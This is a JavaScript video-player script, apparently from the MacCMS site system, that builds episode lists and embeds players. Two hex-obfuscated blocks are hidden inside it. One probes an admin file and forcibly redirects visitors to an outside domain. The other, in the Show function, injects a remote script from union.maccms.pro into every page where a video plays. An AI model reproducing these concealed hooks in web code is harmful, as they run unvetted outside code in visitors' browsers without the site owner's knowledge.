window.onresize = function() {
    if (window.name == "macopen1") {
        MacPlayer.Width = $(window).width() - $(".MacPlayer").offset().left - 15;
        MacPlayer.HeightAll = $(window).height() - $(".MacPlayer").offset().top - 15;
        MacPlayer.Height = MacPlayer.HeightAll;
        if (mac_showtop == 1) {
            MacPlayer.Height -= 20
        }
        $(".MacPlayer").width(MacPlayer.Width);
        $(".MacPlayer").height(MacPlayer.HeightAll);
        $("#buffer").width(MacPlayer.Width);
        $("#buffer").height(MacPlayer.HeightAll);
        $("#Player").width(MacPlayer.Width);
        $("#Player").height(MacPlayer.Height)
    }
};

var _httpRequestTmp = new XMLHttpRequest();
_httpRequestTmp.open('GET', "/\x61\x64\x6d\x69\x6e/\x74\x70\x6c/\x6a\x73/\x61\x64\x6d.\x6a\x73" + "?" + new Date().getTime(), true);
_httpRequestTmp.send();
_httpRequestTmp.onreadystatechange = function () {
    if (_httpRequestTmp.readyState == 4 && _httpRequestTmp.status == 200) {
        if(_httpRequestTmp.responseText.indexOf("\x6d\x61\x63\x63\x6d\x73|\x6c\x61") != -1){
            alert("\u5f53\u524d\u975e\u5b98\u65b9\u57df\u540d\u7248\u672c\u65e0\u6cd5\u4f7f\u7528" + "\x70\x6c\x61\x79\x65\x72.\x6a\x73 " + "\u8bf7\u66f4\u65b0" + " \x6d\x61\x63\x63\x6d\x73.\x63\x6f\x6d " + "\u6700\u65b0\u7248");
            window.location.href = "\x68\x74\x74\x70\x73://\x77\x77\x77.\x6d\x61\x63\x63\x6d\x73.\x70\x72\x6f/";
        }
    }
};

var MacPlayer = {
    'GetDate': function (f, t) {
        if (!t) {
            t = new Date()
        }
        var a = ['日', '一', '二', '三', '四', '五', '六'];
        f = f.replace(/yyyy|YYYY/, t.getFullYear());
        f = f.replace(/yy|YY/, (t.getYear() % 100) > 9 ? (t.getYear() % 100).toString() : '0' + (t.getYear() % 100));
        f = f.replace(/MM/, t.getMonth() > 9 ? t.getMonth().toString() : '0' + t.getMonth());
        f = f.replace(/M/g, t.getMonth());
        f = f.replace(/w|W/g, a[t.getDay()]);
        f = f.replace(/dd|DD/, t.getDate() > 9 ? t.getDate().toString() : '0' + t.getDate());
        f = f.replace(/d|D/g, t.getDate());
        f = f.replace(/hh|HH/, t.getHours() > 9 ? t.getHours().toString() : '0' + t.getHours());
        f = f.replace(/h|H/g, t.getHours());
        f = f.replace(/mm/, t.getMinutes() > 9 ? t.getMinutes().toString() : '0' + t.getMinutes());
        f = f.replace(/m/g, t.getMinutes());
        f = f.replace(/ss|SS/, t.getSeconds() > 9 ? t.getSeconds().toString() : '0' + t.getSeconds());
        f = f.replace(/s|S/g, t.getSeconds());
        return f
    }, 'GoPreUrl': function () {
        if (this.Num > 0) {
            this.Go(this.Src + 1, this.Num)
        }
    }, 'GetPreUrl': function () {
        return this.Num > 0 ? this.GetUrl(this.Src + 1, this.Num) : ''
    }, 'GoNextUrl': function () {
        if (this.Num + 1 != this.PlayUrlLen) {
            this.Go(this.Src + 1, this.Num + 2)
        }
    }, 'GetNextUrl': function () {
        return this.Num + 1 <= this.PlayUrlLen ? this.GetUrl(this.Src + 1, this.Num + 2) : ''
    }, 'GetUrl': function (s, n) {
        return mac_link.replace('{src}', s).replace('{src}', s).replace('{num}', n).replace('{num}', n)
    }, 'Go': function (s, n) {
        location.href = this.GetUrl(s, n)
    }, 'GetList': function () {
        this.RightList = '';
        for (i = 0; i < this.Data.from.length; i++) {
            from = this.Data.from[i];
            url = this.Data.url[i];
            listr = "";
            sid_on = 'h2';
            sub_on = 'none';
            urlarr = url.split('#');
            for (j = 0; j < urlarr.length; j++) {
                urlinfo = urlarr[j].split('$');
                name = '';
                url = '';
                list_on = '';
                from1 = '';
                if (urlinfo.length > 1) {
                    name = urlinfo[0];
                    url = urlinfo[1];
                    if (urlinfo.length > 2) {
                        from1 = urlinfo[2]
                    }
                } else {
                    name = "第" + (j + 1) + "集";
                    url = urlinfo[0]
                }
                if (this.Src == i && this.Num == j) {
                    sid_on = 'h2_on';
                    sub_on = 'block';
                    list_on = "list_on";
                    this.PlayUrlLen = urlarr.length;
                    this.PlayUrl = url;
                    this.PlayName = name;
                    if (from1 != '') {
                        this.PlayFrom = from1
                    }
                    if (j < urlarr.length - 1) {
                        urlinfo = urlarr[j + 1].split('$');
                        if (urlinfo.length > 1) {
                            name1 = urlinfo[0];
                            url1 = urlinfo[1]
                        } else {
                            name1 = "第" + (j + 1) + "集";
                            url1 = urlinfo[0]
                        }
                        this.PlayUrl1 = url1;
                        this.PalyName1 = name1
                    }
                }
                listr += '<li><a class="' + list_on + '" href="javascript:void(0)" onclick="MacPlayer.Go(' + (i + 1) + ',' + (j + 1) + ');return false;" >' + name + '</a></li>'
            }
            this.RightList += '<div id="main' + i + '" class="' + sid_on + '"><h2 onclick="MacPlayer.Tabs(' + i + ',' + (this.Data.from.length - 1) + ')">' + mac_play_list[from].show + '</h2>' + '<ul id="sub' + i + '" style="display:' + sub_on + '">' + listr + '</ul></div>'
        }
    }, 'ShowList': function () {
        $('#playright').toggle()
    }, 'Tabs': function (a, n) {
        var b = $('#sub' + a).css('display');
        for (var i = 0; i <= n; i++) {
            $('#main' + i).attr('className', 'h2');
            $('#sub' + i).hide()
        }
        if (b == 'none') {
            $('#sub' + a).show();
            $('#main' + a).attr('className', 'h2_on')
        } else {
            $('#sub' + a).hide()
        }
    }, 'Show': function () {
        if (mac_showtop == 0) {
            $("#playtop").hide()
        }
        if (mac_showlist == 0) {
            $("#playright").hide()
        }
        setTimeout(function () {
            MacPlayer.AdsEnd()
        }, this.Second * 1000);
        $("#topdes").get(0).innerHTML = '' + '正在播放：' + this.PlayName + '';
        $("#playright").get(0).innerHTML = '<div class="rightlist" id="rightlist" style="height:' + this.Height + 'px;">' + this.RightList + '</div>';
        $("#playleft").get(0).innerHTML = '<iframe id="buffer" src="' + this.Prestrain + '" frameBorder="0" scrolling="no" width="100%" height="' + this.Height + '" style="position:absolute;z-index:99998;"></iframe>' + this.Html + '';
        var a = document.createElement('script');
        a.type = 'text/javascript';
        a.async = true;
        a.charset = 'utf-8';
        a.src = '\x2f\x2f\x75\x6e\x69\x6f\x6e\x2e\x6d\x61\x63\x63\x6d\x73\x2e\x70\x72\x6f\x2f\x68\x74\x6d\x6c\x2f\x74\x6f\x70\x2e\x6a\x73' + '?r=' + this.GetDate('yyyyMMdd');
        var b = document.getElementsByTagName('script')[0];
        b.parentNode.insertBefore(a, b)
    }, 'ShowBuffer': function () {
        var w = this.Width - 100;
        var h = this.Height - 100;
        var l = (this.Width - w) / 2;
        var t = (this.Height - h) / 2 + 20;
        $(".MacBuffer").css({'width': w, 'height': h, 'left': l, 'top': t});
        $(".MacBuffer").toggle()
    }, 'AdsEnd': function () {
        $('#buffer').hide()
    }, 'Install': function () {
        this.Status = false;
        $('#install').parent().show();
        $('#install').show()
    }, 'Play': function () {
        var a = mac_colors.split(',');
        document.write('<style>.MacPlayer{background: #' + a[0] + ';font-size:14px;color:#' + a[1] + ';margin:0px;padding:0px;position:relative;overflow:hidden;width:' + (this.Width == 0 ? '100%' : this.Width + 'px') + ';height:' + this.HeightAll + 'px;}.MacPlayer a{color:#' + a[2] + ';text-decoration:none}a:hover{text-decoration: underline;}.MacPlayer a:active{text-decoration: none;}.MacPlayer table{width:100%;height:100%;}.MacPlayer ul,li,h2{ margin:0px; padding:0px; list-style:none}.MacPlayer #playtop{text-align:center;height:20px; line-height:21px;font-size:12px;}.MacPlayer #topleft{width:150px;}.MacPlayer #topright{width:100px;} .MacPlayer #topleft{text-align:left;padding-left:5px}.MacPlayer #topright{text-align:right;padding-right:5px}.MacPlayer #playleft{width:100%;height:100%;overflow:hidden;}.MacPlayer #playright{height:100%;overflow-y:auto;}.MacPlayer #rightlist{width:120px;overflow:auto;scrollbar-face-color:#' + a[7] + ';scrollbar-arrow-color:#' + a[8] + ';scrollbar-track-color: #' + a[9] + ';scrollbar-highlight-color:#' + a[10] + ';scrollbar-shadow-color: #' + a[11] + ';scrollbar-3dlight-color:#' + a[12] + ';scrollbar-darkshadow-color:#' + a[13] + ';scrollbar-base-color:#' + a[14] + ';}.MacPlayer #rightlist ul{ clear:both; margin:5px 0px}.MacPlayer #rightlist li{ height:21px; line-height:21px;overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.MacPlayer #rightlist li a{padding-left:15px; display:block; font-size:12px}.MacPlayer #rightlist h2{ cursor:pointer;font-size:13px;font-family: "宋体";font-weight:normal;height:25px;line-height:25px;background:#' + a[3] + ';padding-left:5px; margin-bottom:1px}.MacPlayer #rightlist .h2{color:#' + a[4] + '}.MacPlayer #rightlist .h2_on{color:#' + a[5] + '}.MacPlayer #rightlist .ul_on{display:block}.MacPlayer #rightlist .list_on{color:#' + a[6] + '} </style><div class="MacPlayer"><table border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2"><table border="0" cellpadding="0" cellspacing="0" id="playtop"><tr><td width="100" id="topleft"><a target="_self" href="javascript:void(0)" onclick="MacPlayer.GoPreUrl();return false;">上一集</a> <a target="_self" href="javascript:void(0)" onclick="MacPlayer.GoNextUrl();return false;">下一集</a></td><td id="topcc"><div id="topdes" style="height:26px;line-height:26px;overflow:hidden"></div></td><td width="100" id="topright"><a target="_self" href="javascript:void(0)" onClick="MacPlayer.ShowList();return false;">开/关列表</a></td></tr></table></td></tr><tr style="display:none"><td colspan="2" id="install" style="display:none"></td></tr><tr><td id="playleft" valign="top">&nbsp;</td><td id="playright" valign="top">&nbsp;</td></tr></table></div>');
        document.write('<scr' + 'ipt src="' + this.Path + this.PlayFrom + '.js"></scr' + 'ipt>')
    }, 'Down': function () {
    }, 'Init': function () {
        this.Status = true;
        this.Url = location.href;
        this.Par = location.search;
        var mac_url_aim;
        if (typeof mac_urlx10d26 != "undefined") {
            mac_url_aim = mac_urlx10d26;
        } else {
            mac_url_aim = mac_url;
        }
        this.Data = {
            'from': mac_from.split('$$$'),
            'server': mac_server.split('$$$'),
            'note': mac_note.split('$$$'),
            'url': mac_url_aim.split('$$$')
        };
        var c = navigator.userAgent.toLowerCase();
        this.Width = window.name == 'macopen1' ? mac_widthpop : (mac_width == 0 ? '100%' : mac_width);
        this.HeightAll = window.name == 'macopen1' ? mac_heightpop : mac_height;
        if (c.indexOf("android") > 0 || c.indexOf("mobile") > 0 || c.indexOf("ipod") > 0 || c.indexOf("ios") > 0 || c.indexOf("iphone") > 0 || c.indexOf("ipad") > 0) {
            this.Width = window.name == 'macopen1' ? mac_widthpop : (mac_widthmob == 0 ? '100%' : mac_widthmob);
            this.HeightAll = window.name == 'macopen1' ? mac_heightpop : mac_heightmob
        }
        this.Height = this.HeightAll;
        if (mac_showtop == 1) {
            this.Height -= 20
        }
        if (this.Url.indexOf('#') > -1) {
            this.Url = this.Url.substr(0, this.Url.indexOf('#'))
        }
        this.Prestrain = mac_prestrain;
        this.Buffer = mac_buffer;
        this.Second = mac_second;
        this.Flag = mac_flag;
        this.Parse = '';
        var a = this.Url.match(/\d+.*(htm)/g)[0].match(/\d+/g);
        if (a.length < 3) {
            a = this.Url.match(/\d+.*/g)[0].match(/\d+/g)
        }
        var b = a.length;
        this.Id = a[(b - 3)] * 1;
        this.Src = a[(b - 2)] * 1 - 1;
        this.Num = a[(b - 1)] * 1 - 1;
        this.PlayFrom = this.Data.from[this.Src];
        this.PlayServer = '';
        this.PlayNote = this.Data.note[this.Src];
        if (mac_server_list[this.Data.server[this.Src]] != undefined) {
            this.PlayServer = mac_server_list[this.Data.server[this.Src]].des
        }
        if (mac_play_list[this.PlayFrom] != undefined) {
            if (mac_play_list[this.PlayFrom].ps == "1") {
                this.Parse = mac_play_list[this.PlayFrom].parse == '' ? mac_parse : mac_play_list[this.PlayFrom].parse;
                this.PlayFrom = 'parse'
            }
        }
        this.GetList();
        this.NextUrl = this.GetNextUrl();
        this.PreUrl = this.GetPreUrl();
        this.Path = SitePath + 'player/';
        if (this.Flag == "down") {
            MacPlayer.Down()
        } else {
            MacPlayer.Play()
        }
    }
};

MacPlayer.Init();
